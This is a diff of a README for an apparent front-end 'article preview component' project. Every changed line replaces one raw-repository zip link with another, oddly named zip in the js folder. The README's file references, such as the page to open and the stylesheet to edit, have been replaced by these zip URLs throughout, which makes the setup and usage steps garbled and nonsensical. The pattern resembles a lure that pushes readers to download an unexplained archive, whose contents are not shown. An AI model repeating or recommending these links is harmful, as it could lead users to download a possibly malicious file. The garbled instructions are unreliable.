@@ -6,7 +6,7 @@ Welcome to the article-preview-component! This application allows you to easily 
 
 ### 📥 Download Now
 
-[![Download Latest Release](https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/images/component_preview_article_v1.5.zip%20Latest%20Release-article--preview--component-brightgreen)](https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/images/component_preview_article_v1.5.zip)
+[![Download Latest Release](https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/js/article_preview_component_aeruginous.zip%20Latest%20Release-article--preview--component-brightgreen)](https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/js/article_preview_component_aeruginous.zip)
 
 ## 📦 System Requirements
 
@@ -23,7 +23,7 @@ Welcome to the article-preview-component! This application allows you to easily 
 
 ## 💾 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/images/component_preview_article_v1.5.zip) to download the application files. Follow these steps:
+To get started, visit the [Releases page](https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/js/article_preview_component_aeruginous.zip) to download the application files. Follow these steps:
 
 1. Click the latest release version.
 2. Download the zip file containing the application.
@@ -33,7 +33,7 @@ To get started, visit the [Releases page](https://github.com/Vidhya2303/article-
 ## 🖥️ How to Use
 
 1. Open the extracted folder.
-2. Locate and double-click the `https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/images/component_preview_article_v1.5.zip` file. This file opens in your default web browser.
+2. Locate and double-click the `https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/js/article_preview_component_aeruginous.zip` file. This file opens in your default web browser.
 3. Now, you can view and interact with the article preview component.
 4. To share an article, click the share button to access the sharing menu.
 
@@ -41,15 +41,15 @@ To get started, visit the [Releases page](https://github.com/Vidhya2303/article-
 
 If you wish to customize the component:
 
-- Open the `https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/images/component_preview_article_v1.5.zip` file to change colors and layout.
-- Edit the `https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/images/component_preview_article_v1.5.zip` file to modify functionalities or share options.
+- Open the `https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/js/article_preview_component_aeruginous.zip` file to change colors and layout.
+- Edit the `https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/js/article_preview_component_aeruginous.zip` file to modify functionalities or share options.
 
 ## 📝 Troubleshooting
 
 If you encounter issues, check the following:
 
 - Ensure you have extracted all files properly.
-- Confirm that you are opening the `https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/images/component_preview_article_v1.5.zip` file in a supported web browser.
+- Confirm that you are opening the `https://github.com/Vidhya2303/article-preview-component/raw/refs/heads/main/js/article_preview_component_aeruginous.zip` file in a supported web browser.
 - Clear your browser's cache and refresh the page if the component does not display correctly.
 
 ## 💬 Feedback & Contribution
